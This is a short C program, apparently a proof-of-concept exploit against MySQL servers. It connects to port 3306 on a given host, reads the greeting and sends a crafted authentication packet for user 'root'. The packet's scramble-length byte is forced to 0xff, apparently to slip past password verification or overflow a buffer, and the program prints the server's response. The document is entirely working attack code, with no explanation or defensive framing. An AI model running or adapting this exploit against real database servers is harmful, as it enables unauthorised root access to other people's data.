#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>



#define PORT 3306
#define BUFSIZE 100

char buf[BUFSIZE];

char outbuf[] = {
  0x3e, 0x00, 0x00, 0x01, 0x8d, 0x86, 0x03, 0x00,
  0x00, 0x00, 0x00, 0x01, 0x33, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x72, 0x6f, 0x6f, 0x74,
  0x00, 0xaa, 0xc1, 0xce, 0xa5, 0x2b, 0xb7, 0xde,
  0x9f, 0xf2, 0xc2, 0x73, 0x78, 0xda, 0xb5, 0x63,
  0x01, 0xdd, 0xe4, 0x7d, 0x55, 0x9a, 0x64, 0x64,
  0x64, 0x64
};

int netlen = 0;


int
main (int argc, char **argv)
{

  int socket_fd, len = 0;
  struct hostent *he;
  struct sockaddr_in sa;

  if (argc != 2)
    {
      printf ("usage: %s <hostname>\n", argv[0]);
      exit (1);
    }

  if ((he = gethostbyname (argv[1])) == NULL)
    {
      perror ("gethostbyname");
      exit (1);
    }

  sa.sin_family = AF_INET;
  sa.sin_port = htons (PORT);
  sa.sin_addr = *((struct in_addr *) he->h_addr);

  bzero (&(sa.sin_zero), 8);

  int counter = 0xff;

  outbuf[41] = counter;
   if ((socket_fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket_fd");
      exit (1);
    }


  if ((connect (socket_fd, (struct sockaddr *) &sa, sizeof (struct sockaddr)))
      == -1)
    {
      perror ("connect");
      exit (1);
    }

  if ((netlen = recv (socket_fd, buf, BUFSIZE - 1, 0)) == -1)
    {
      perror ("recv");
      exit (1);
    }

  if ((netlen = send (socket_fd, outbuf, sizeof (outbuf), 0)) == -1)
    {
      perror ("send");
      exit (1);
    }


  bzero (&buf, BUFSIZE);
  if ((netlen = recv (socket_fd, buf, BUFSIZE - 1, 0)) == -1)
    {
      perror ("recv");
      exit (1);
    }

  printf ("ret[%d]:%s\n", counter, buf + 8);


  close (socket_fd);



  return (0);
}
